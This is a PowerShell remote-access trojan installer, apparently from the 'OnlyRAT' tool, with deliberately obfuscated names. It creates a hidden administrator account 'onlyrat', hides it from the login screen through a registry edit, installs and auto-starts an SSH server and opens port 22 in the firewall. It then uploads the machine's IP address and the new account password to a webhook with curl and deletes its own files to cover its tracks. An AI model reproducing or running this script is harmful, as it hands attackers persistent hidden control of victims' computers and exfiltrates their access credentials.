function RpLGWiUsIy {
    return -join ((65..90) + (97..122) | Get-Random -Count 5 | ForEach-Object {[char]$_})
}

function geIwCZloBx {
    [CmdletBinding()]
    param (
        [string] $sqbXFdLvyw,
        [securestring] $CBFXIYeWPR
    )    
    begin {
    }    
    process {
        New-LocalUser "$sqbXFdLvyw" -Password $CBFXIYeWPR -FullName "$sqbXFdLvyw" -Description "Temporary local admin"
        Write-Verbose "$sqbXFdLvyw local user crated"
        Add-LocalGroupMember -Group "Administrators" -Member "$sqbXFdLvyw"
        Write-Verbose "$sqbXFdLvyw added to the local administrator group"
    }    
    end {
    }
}

# make admin
$sqbXFdLvyw = "onlyrat"
$DCilJFugpP = RpLGWiUsIy
Remove-LocalUser -Name $sqbXFdLvyw
$HcMjDkGFes = (ConvertTo-SecureString $DCilJFugpP -AsPlainText -Force)
geIwCZloBx -sqbXFdLvyw $sqbXFdLvyw -CBFXIYeWPR $HcMjDkGFes

# registry
$csfMFzvgEN = 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList'
$jmQikqoKMZ = '00000000'
New-Item -Path 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' -Name SpecialAccounts -Force
New-Item -Path 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts' -Name UserList -Force
New-ItemProperty -Path $csfMFzvgEN -Name $sqbXFdLvyw -Value $jmQikqoKMZ -PropertyType DWORD -Force
# ssh
Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0
Start-Service sshd
Set-Service -Name sshd -StartupType 'Automatic'

# Allow firewall for SSH
New-NetFirewallRule -Name "OpenSSH-Server" -DisplayName "OpenSSH Server" -Enabled True -Direction Inbound -Protocol TCP -Action Allow -LocalPort 22

# Create SSH directory and accept localhost key
New-Item -ItemType Directory -Path "$env:USERPROFILE\.ssh" -Force
ssh-keyscan -H localhost >> "$env:USERPROFILE\.ssh\known_hosts" 2>$null

# rat file
$CRYnrkaDbe = "$env:UserName.rat"
$AhdjktGyiZ = (Get-NetIPConfiguration | Where-Object { $_.IPv4DefaultGateway -ne $null -and $_.NetAdapter.Status -ne "Disconnected"}).IPv4Address.IPAddress

New-Item -Path $CRYnrkaDbe -Force
Add-Content -Path $CRYnrkaDbe -Value $AhdjktGyiZ -Force # local ip addr
Add-Content -Path $CRYnrkaDbe -Value $DCilJFugpP -Force # pass
Add-Content -Path $CRYnrkaDbe -Value $env:temp -Force # temp
Add-Content -Path $CRYnrkaDbe -Value $pwd -Force # startup
Add-Content -Path $CRYnrkaDbe -Value "N/A" -Force # remote host
Add-Content -Path $CRYnrkaDbe -Value "22" -Force # SSH PORT - CHANGED FROM "N/A" TO "22"
Add-Content -Path $CRYnrkaDbe -Value 'local' -Force # connection type

# send file to webhook
$PEBgxuJUfd = Get-Content lawFvVTikZ.txt | Out-String
Invoke-Expression "curl.exe -F `"payload_json={\```"username\```": \```"onlyrat\```", \```"content\```": \```"download me\```"}`" -F ```"file=@$env:username.rat```" $PEBgxuJUfd"

# cleanup
attrib +h +s +r C:/Users/onlyrat 
Remove-Item $CRYnrkaDbe -Force
Remove-Item lawFvVTikZ.txt -Force
Remove-Item KFPGaEYdcz.ps1 -Force
